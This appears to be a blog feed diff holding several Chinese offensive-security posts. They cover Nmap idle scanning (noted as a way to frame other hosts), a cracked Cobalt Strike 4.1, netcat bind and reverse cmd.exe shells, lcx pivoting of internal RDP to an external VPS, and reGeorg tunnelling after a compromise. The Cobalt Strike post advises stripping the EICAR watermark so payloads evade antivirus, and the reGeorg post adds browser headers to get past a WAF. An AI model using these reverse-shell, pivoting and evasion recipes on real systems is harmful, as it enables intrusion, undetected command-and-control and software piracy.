+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image9.png"><br>Nmap会伪造以目标IP地址（192.168.81.130）向空闲主机端口发送了 4 个<br>SA（SYN，ACK） 包和 1<br>个以真实IP（192.168.81.129）向空闲主机端口发送的的SA（SYN，ACK）包。发送真实IP的SA包用来接收空闲主机发回来的RST包，用RST包的id来确定之前发送的4个伪造以目标IP的包空闲主机是否接收并产生交互。我们可以看到RST包中id为5459而扫描之前id为5454，相差5，正好是4个伪造包</p>
+<ul>
+<li>1个真实包。所以Nmap认为目标和空闲主机之间是可以通信交互的。</li>
+</ul>
+<p>最后就是利用原理进行扫描：Nmap开始伪造以空闲主机IP地址（192.168.81.2）向目标发送<br>SYN<br>包，以期待目标（192.168.81.130）接收到以空闲主机IP（192.168.81.2）的SYN包后，按照TCP握手协议来向空闲主机（192.168.81.2）发送第二次握手的SYN，ACK包。空闲主机直接接收到SYN，ACK,判定握手不合法会回复RST包，并且包中id+1。Nmap以真实IP向空闲主机发送SYN，ACK包，空闲主机回复RST包，包中id再一次+1。从图中而可以看到扫描的端口的包中id从5459-5461，5463-5461等均相差为<br>2 ，则可认为目标端口开放。</p>
+<h1 id="ipidseq脚本"><a href="#ipidseq脚本" class="headerlink" title="ipidseq脚本"></a>ipidseq脚本</h1><p>Nmap提供基于该框架下的NSE（Nmap Script<br>Engine）脚本来进行扫描时的自定义扩展。NSE能够完成网络发现、复杂版本探测、脆弱性探测、简单漏洞利用等功能。</p>
+<p>在我们寻找空闲僵尸主机的时候可以使用官方脚本ipidseq来帮助进行寻找。</p>
+<p>地址：<a href="https://svn.nmap.org/nmap/scripts/ipidseq.nse">https://svn.nmap.org/nmap/scripts/ipidseq.nse</a></p>
+<p>我们来看下其中的基本实现和判断，主要判断实现再ipidseqClass中：</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image10.png"><br><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image11.png"><br>整体看来如果结果是Incremental!（递增），是最优选择。如果没有则Broken<br>incremental!（损坏递增）勉强可堪一用，但扫描结果不太保证。</p>
+<h1 id="Nmap空闲扫描实战中的注意事项"><a href="#Nmap空闲扫描实战中的注意事项" class="headerlink" title="Nmap空闲扫描实战中的注意事项"></a>Nmap空闲扫描实战中的注意事项</h1><p>首先找到一个空闲的僵尸主机，我们可以使用上一节提到的ipidseq脚本来进行探测寻找。</p>
+<p>探测网段中空闲主机的命令为：</p>
+<p>nmap –script ipidseq 192.168.81.1/24</p>
+<p>直接使用会报没有权限的问题：</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image12.png"><br>我们需要使用 sudo ：</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image13.png"><br>可以看到我们运气很不错，探测192.168.81.2的80端口在ipidseq脚本结果为Incremental!（递增），这代表我们可以尝试使用该台主机的80端口作为空闲僵尸主机。</p>
+<p>我们直接使用192.168.81.2作为空闲僵尸主机对目标192.168.81.130进行空闲扫描</p>
+<p>一般的使用命令为：</p>
+<p>nmap -Pn -sI 192.168.81.2 92.168.81.130</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image14.png"><br>等一下之后即可看到利用成功，扫描结果也显示出来了。</p>
+<p>在实战中如果该空闲主机不可用，则可能会报以下类型的错误：</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image15.png"><br>这时候就需要更换空闲主机。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然Nmap提供欺骗扫描技术（-D）来帮助用户保护自己的身份，但是这种扫描（不像空闲扫描）仍需要攻击者使用自己真实的IP发送很多的数据包以便获取扫描结果。空闲扫描的优点之一是即使入侵检测系统若发出警报，则会报告空闲僵尸主机已开始对他们扫描。因此可以用该种扫描技术给其他主机栽赃。当然默认情况下空闲扫描虽然可以伪造IP地址进行发包，但是MAC地址依然是真实主机的，所以在检测和防御时可以以此为依据机型判断。</p>
+<p>随着攻防对抗的升级无论何种扫描形式最终都会被捕获察觉。当我们在研究原理和实现之后，再不断地进行优化，保持不断地自我更新才能在这日益月薪攻方的浪潮中立于前方。一起加油吧~</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image16.jpeg"></p>
+<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
+      <categories>
+        <category>原创文章</category>
+      </categories>
+      <tags>
+        <tag>安全工具</tag>
+        <tag>Nmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CS4.1真的有后门吗？</title>
+    <url>/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/</url>
+    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CS是什么？可能是某款历史久远的第一人称射击游戏，也可能是某个电影。由于法律原因我们这里并不指出CS是什么，但网络江湖上一直流传着他的传说。</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image1.jpeg"></p>
+<p>江湖上流程最新版本4.1已经有一阵了，但是江湖上还传出各种小道消息说有后门/外联情况，导致小伙伴们都太不敢用啊。所以到底CS4.1有没有后门，今天我们一起来探索下~</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image2.png"></p>
+<h1 id="0x01-入手CS4-1"><a href="#0x01-入手CS4-1" class="headerlink" title="0x01 入手CS4.1"></a>0x01 入手CS4.1</h1><p>我直接从江湖人士手中拿到了流传最火的CS4.1的破解版本。我入手的版本是号称中文版，里边的内容如下：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image3.png"></p>
+<p>可以看到主程序jar包的修改日期为2020-07-28，这个时间应该是破解重新打包的时间。我得到版本的jar文件MD5为：187a**<strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong>9613</p>
+<p>我们知道jar包本质上就是zip包，所以我们修改文件后缀名为zip之后直接打开。查看各个文件修改的时间戳：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image4.png"></p>
+<p>可以看到大部分文件和文件夹的修改时间为2020-06-24，推测此时间为jar包生成时间，在经过一天后于2020-06-25对外发布。</p>
+<p>经过详细排查发现有4个文件的时间戳跟其他文件明显不同：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image5.png"></p>
+<p>我们分别叫他们B文件、A文件、S文件和c文件。</p>
+<p>这4个文件的修改代表对4.1破解流程的思路。笔者有幸从另一位江湖人士手中获取到4.0的原版，4.0到4.1版本应该只是修复了一些bug和增加了一些功能，所以我们通过对比原版和破解版之间的代码来看看破解者到底做了哪些改动。</p>
+<h1 id="0x02-修改验证"><a href="#0x02-修改验证" class="headerlink" title="0x02 修改验证"></a>0x02 修改验证</h1><p>首当其冲的就是A文件，从命名上就可以看出来这个文件是进行验证授权的。</p>
+<p>我们可以通过Java Decompiler 来看查看源码，大部分验证逻辑都在构造函数中：<br><em>原版</em></p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image6.png"></p>
+<p>破解版：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image7.png"></p>
+<p>熟悉CS破解的朋友可以看得出来，这里是CoolCat大佬的思路：</p>
+<p>将正确的密钥文件解密后，直接将解密后的数据写到程序里进行下一步验证，并将原本读取c文件并解密的操作代码删除掉。</p>
+<p>那既然在这里c文件已经不用读取了，那为啥在破解版本里还要有这个文件的存在呢？</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image8.jpeg"></p>
+<p>这里就牵扯到CS的另一套产品控制机制，CS会将一些Windows下的操作封装成dll库，如：截屏、bypassuac、mimikatz等。并且为了控制用户需购买密钥，验证之后才可以合法使用，会将这些文件进行加密。使用时先读取文件，再用密钥文件来进行解密后使用。</p>
+<p>而修改的文件S文件就是读取文件并进行解密的关键类，我们来看下原版的相关调用代码：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image9.png"></p>
+<p>可以很清晰的看出从A文件中调用S文件的过程。</p>
+<p>我们再来看下破解版的代码：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image10.png"></p>
+<p>我们看到破解版中直接从c文件中读取数据直接作为字节进行注册，而原版读取了c文件中的内容还需要解密之后读取字节才可以注册。所以虽然原版和破解版都包含该文件，但是文件内容和意义大不相同，我们从文件大小也可以看出差别：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image11.png"></p>
+<p>所以这些文件的修改都是针对验证进行了破解，并没有加入后门。</p>
+<h1 id="0x03-exit暗桩"><a href="#0x03-exit暗桩" class="headerlink" title="0x03 exit暗桩"></a>0x03 exit暗桩</h1><p>最后一个修改文件为B文件，<br>我们来看下B文件，这个文件是TeamServer的核心文件：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image12.png"></p>
+<p>this.data.shouldPad<br>调用的函数就在我们的修改类B文件里，我们来看下原版和破解版的区别：</p>
+<p>原版：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image13.png"></p>
+<p>破解版：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image14.png"></p>
+<p>我们可以看到破解版直接将shouldPad置为了false，这样无论校验结果如何都不会增加exit命令，从而达到去掉exit暗桩的效果。</p>
+<p>所以B文件的修改是为了去除作者进行产品控制的exit暗桩。</p>
+<h1 id="0x04-外联问题"><a href="#0x04-外联问题" class="headerlink" title="0x04 外联问题"></a>0x04 外联问题</h1><p>笔者用的方法比较笨：将服务器端和被控端跑在纯净的操作系统中，操作系统中将更新关闭并且只安装了<br>WireShark 来进行长期抓包。</p>
+<p>经过测试，在运行了24小时之后查看WireShark 报文中并未发现可疑外联。</p>
+<p>当然即便是使用这种笨办法测试，也不能完全100% 确信没有外联。</p>
+<h1 id="0x05-其他问题"><a href="#0x05-其他问题" class="headerlink" title="0x05 其他问题"></a>0x05 其他问题</h1><p>目前看来CS4.1已经可以列入我们的武器库中了，但是其实还有其他问题需要我们来自己动手修改。</p>
+<h2 id="过期问题"><a href="#过期问题" class="headerlink" title="过期问题"></a>过期问题</h2><p>虽然我们在破解验证的时候通过大佬的分享使用了正版密钥的数据，但这些数据中包含了授权时间信息，网上有资料说需要将过期的判断改一下。</p>
+<p>我们来看下破解版中的此部分代码，此部分代码在A文件中：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image15.png"></p>
+<p>代码中并没有处理过期判断，我们可以将判断直接返回false即可。</p>
+<p>但是我们其实也可以不做任何修改，也不会有影响：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image16.png"></p>
+<p>破解版中的密钥字节经过测试计算为29999999，即为永久版。</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image17.png"></p>
+<p>而在所有调用中只有一个文件有用到这些判断：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image18.png"></p>
+<p>非永久版才会进行过期的验证判断，我们既然已经是永久版，就可以不用管过期问题。</p>
+<h2 id="WaterMark"><a href="#WaterMark" class="headerlink" title="WaterMark"></a>WaterMark</h2><p>watermark即为水印，此参数中在A文件会进行赋值。</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image19.png"></p>
+<p>经过测试发现此参数赋值为0：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image20.png"></p>
+<p>为0就会有一个很不好的后果，从变量命名上我们也可以获知一二，就是会增加水印。但是CS增加的水印并不会显示在界面UI上，而是会在生成的shellcode中：</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image21.png"></p>
+<p>有人会觉得哪有啥的，不就在shellcode里增加了一段谁都看不懂的字符串，搞不好还进行混淆了呢，这有什么的~</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image22.jpeg"></p>
+<p>但是非常抱歉，这段神秘代码并不是一段普通的字符串！</p>
+<p>这段字符串是EICAR（欧洲计算机防病毒研究所）开发的一种测试代码，本意是用于测试设备的防病毒能力。它本质上不是病毒，也并不包含任何程序代码。</p>
+<p>最简单的测试方式是将这段字符串复制到一个空白的”新建文本文档.txt”中并保存，用杀软对此文件进行扫描会立即告警。</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image23.png"></p>
+<p>所以一旦某个文件包含或者流量中包含这段代码，就会被大部分杀软和流量检测设备检测到并发出告警。</p>
+<p>我们的解决方案就是将watermark在验证阶段赋值为非0，并且将这段神秘代码在CS中删除。</p>
+<p>经过反编译修改并重新打包后，我们终于可以愉快的玩耍啦~</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image24.jpeg"></p>
+<h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>所有4个修改的地方我们都一一看过了，外联测试我们用笨方法也测试过了，这个版本还是比较干净的，但人心险恶江湖叵测，随着流传版本越来越多，很有可能在传播过程中有人放进自己的代码。当然也不排除有官方作者藏得更深的暗桩，所以我们可能需要更多的细心和耐心还需要更深的代码功底，才可能挖掘出更深层的东西。</p>
+<p><img src="/2020/12/10/CS4-1%E7%9C%9F%E7%9A%84%E6%9C%89%E5%90%8E%E9%97%A8%E5%90%97%EF%BC%9F/image25.png"></p>
+<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
+      <categories>
+        <category>原创文章</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>netcat常用命令说明</title>
+    <url>/2021/01/27/netcat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/</url>
+    <content><![CDATA[<h1 id="命令说明："><a href="#命令说明：" class="headerlink" title="命令说明："></a>命令说明：</h1><p>监听端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888</span><br></pre></td></tr></table></figure>
+<p>监听端口并执行cmd</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888 -e cmd.exe</span><br></pre></td></tr></table></figure>
+<p>直接正向连接 IP + 端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -nvv 192.168.81.140 8888</span><br></pre></td></tr></table></figure>
+<p>将 cmd 转发到 IP + 端口 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -e cmd.exe 192.168.81.128 8889</span><br></pre></td></tr></table></figure>
+
+<h1 id="实战使用："><a href="#实战使用：" class="headerlink" title="实战使用："></a>实战使用：</h1><h3 id="正向："><a href="#正向：" class="headerlink" title="正向："></a>正向：</h3><ol>
+<li>受害机器上执行监听 8888 端口并执行 cmd:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888 -e cmd.exe</span><br></pre></td></tr></table></figure></li>
+<li>攻击机直接连接受害机器 IP + 端口 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -nvv 192.168.81.140 8888</span><br></pre></td></tr></table></figure></li>
+<li>攻击机即可执行shell</li>
+</ol>
+<h3 id="反向："><a href="#反向：" class="headerlink" title="反向："></a>反向：</h3><ol>
+<li>攻击机监听 8888 端口<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -l -p 8888</span><br></pre></td></tr></table></figure></li>
+<li>受害机器上将 cmd 转发到攻击机 IP + 端口 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -e cmd.exe 192.168.81.128 8889</span><br></pre></td></tr></table></figure></li>
+<li>攻击机即可接收到受害机器的反弹shell</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具教程</category>
+      </categories>
+      <tags>
+        <tag>内网工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>lcx常用命令说明</title>
+    <url>/2021/01/27/lcx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/</url>
+    <content><![CDATA[<h1 id="命令说明："><a href="#命令说明：" class="headerlink" title="命令说明："></a>命令说明：</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-listen &lt;ConnectPort1&gt; &lt;TransmitPort2&gt;监听p1,接收由p2转发过来的数据 </span><br><span class="line"></span><br><span class="line">-tarn &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信 </span><br><span class="line"></span><br><span class="line">-slave &lt;TransmitHostB&gt; &lt;PortB&gt; &lt;TransmitHostA&gt; &lt;PortA&gt;端口转发功能，将目标A机上的端口A,转发到外网B机的端口B上</span><br></pre></td></tr></table></figure>
+<h1 id="实战使用："><a href="#实战使用：" class="headerlink" title="实战使用："></a>实战使用：</h1><h3 id="两台机器："><a href="#两台机器：" class="headerlink" title="两台机器："></a>两台机器：</h3><ol>
+<li>将内网机器 3389 端口流量转发到外网 VPS 机器 55 端口上:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 192.168.81.128 55 172.16.1.20 3389</span><br></pre></td></tr></table></figure></li>
+<li>在外网 VPS 机器 55 端口上进行监听，,接收由外网 VPS 机器 3389转发过来的数据 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 55 3389</span><br></pre></td></tr></table></figure></li>
+<li>连接外网 VPS 机器 3389 端口即连接内网机器 3389 端口</li>
+</ol>
+<h3 id="多台机器："><a href="#多台机器：" class="headerlink" title="多台机器："></a>多台机器：</h3><p>多台机器中间的机器可能只有某台机器可以出外网，可进行转发具体命令如下：<br><strong>机器1(不可出外网)-172.16.1.10：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 172.16.1.20 55 172.16.1.10 3389</span><br></pre></td></tr></table></figure>
+<p><strong>机器2(不可出外网)-172.16.1.20：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran 55 172.16.1.30 66</span><br></pre></td></tr></table></figure>
+<p><strong>机器3(可出外网)-172.16.1.30：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran 66 192.168.81.128 77</span><br></pre></td></tr></table></figure>
+<p><strong>机器4(外网VPS)-192.168.81.128：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 77 3389</span><br></pre></td></tr></table></figure>
+<p>连接机器 4 外网 VPS 机器的 3389 端口即连接内网机器 1 的 3389 端口</p>
+]]></content>
+      <categories>
+        <category>工具教程</category>
+      </categories>
+      <tags>
+        <tag>内网工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>reGeorg实战攻防</title>
+    <url>/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们已经通过各种操作getshell之后想要进行内网横向渗透，但因为目标ACL策略设置的比较严格，只允许HTTP协议和对应端口通过。我们无法通过使用端口转发或者是端口映射的方法来从外网访问到内网的其他机器。这时我们就会想到reGeorg这款工具，通过该工具代理进入内网，通过HTTP协议转发请求。</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image1.png"></p>
+<p>这个工具创建之初本意并不是专门用来渗透内网，而是某些企业员工在外网的环境下想访问内网资源。所以这几个安全意识不太足的小哥们写了一个可以通过部署在边界上的网页来进行流量转发，从而访问内网的一个办公工具……</p>
+<p>可以看到该工具的’斯搂梗’是说”每个办公室都需要这样的工具”..</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image2.jpeg"></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>那么如此厉害的工具究竟是怎么实现的呢？我们一起来看下源码：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image3.png"></p>
+<p>从入口开始，就是标准的一套：LOGO + argparse 来进行参数的支持和解析，真正逻辑从askGeorg函数开始。这个函数是来测试远程代理服务器是否能够访问，我们来看下这个函数的具体内容：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image4.png"></p>
+<p>可以看到内容基本就是判断是否为HTTPS，然后使用哪个工具。用GET方法来请求，如果状态码为 200 且内容跟远程服务器中内容一样就认为是OK的。</p>
+<p>比较的内容就是浏览器访问看到的那一句话：</p>
+<p>Python中：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image5.png"></p>
+<p>php中：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image6.png"></p>
+<p>浏览器访问：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image7.png"></p>
+<p>我们来继续往下看：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image8.png"><br>监听了客户端的端口，并设置TCP的排队上限为1000，这样的对普通情况来说是足够了。</p>
+<p>后边是创建循环不停的接收报文，并且将接收到的传入 session 线程中并启动。</p>
+<p>session的构造比较简单：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image9.png"></p>
+<p>我们来看下线程最重要run中的内容：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image10.png"></p>
+<p>内容不多，就是判断Socks4还是5并解析，之后是创建读写线程并start</p>
+<p>判断Socks4 还是 5：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image11.png"></p>
+<p>Socks代理至少三个字节的请求,第一个字节一定为5，如果是Socks4，则第一个字节一定为4</p>
+<p>parseSocks5和parseSocks4 为判断对应Socks的协议解析是否成功。</p>
+<p>Reader：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image12.png"></p>
+<p>Writer：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image13.png"></p>
+<p>读写部分是一些转发的常规操作。</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image14.png"></p>
+<h2 id="实战攻防"><a href="#实战攻防" class="headerlink" title="实战攻防"></a>实战攻防</h2><p>在实战中使用可能会碰到一些特殊问题：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image15.png"></p>
+<p>比如在浏览器中访问可以出现熟悉的”Georg says，’All seems fine’”，说明可以正常访问。但是使用reGeorgSocksProxy客户端的时候会报’未准备好，请检查url’，这是为什么呢？</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image16.png"><br>排查问题需要进行一些代码调试：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image17.png"></p>
+<p>通过打印出的关键字搜索，可以看到是askGeorg这个函数返回了False 导致了退出程序。</p>
+<p>这时我们可以进行调试，使用Debug来跟进代码，一行一行看到底哪里出错了。当不具备调试环境时也可以使用打印的方法定位问题。</p>
+<p>这里我们使用打印的方法来定位问题：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image18.png"></p>
+<p>我们再尝试运行一下代码，看看哪里出错：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image19.png"></p>
+<p>可以看到返回的状态码为403，也就是说可能被WAF或者其他安全设备拦截掉了。我们通过代码可以获知只有当状态码为200的时候才可以正常使用，并且我们使用浏览器直接打开是可以正常访问的。也就是说我们的问题出现在了Python脚本跟浏览器的请求差异上，比如一些常见的请求头 User-Agent 、Accept-Language等，这些我们需要一一补上。</p>
+<p>我们需要将每一个请求都加入浏览器所包含的请求头，所以我们将该过程提取出来作为函数使用。</p>
+<p>修改后的代码：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image20.png"></p>
+<p>setupRemoteSession中的CONNECT：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image21.png"></p>
+<p>closeRemoteSession中的DISCONNECT:</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image22.png"></p>
+<p>reader中的READ:</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image23.png"></p>
+<p>Writer中的FORWORD:</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image24.png"><br>修改完代码后我们实际进行测试：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image25.png"></p>
+<p>可以看到返回码已经变为200并且打印出了熟悉的’All seems fine’，说明可以正常使用了。Happy~</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image26.jpeg"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>掌握调试/打印等方法不论是对代码审计和修改脚本都有很大的帮助和提升。我们在实战中会碰到各种各样的问题，这时候需要自己细心耐心以及编码修改能力来解决这些问题。这样我们才可以做到在这不断提升的攻防中稳步前行。</p>
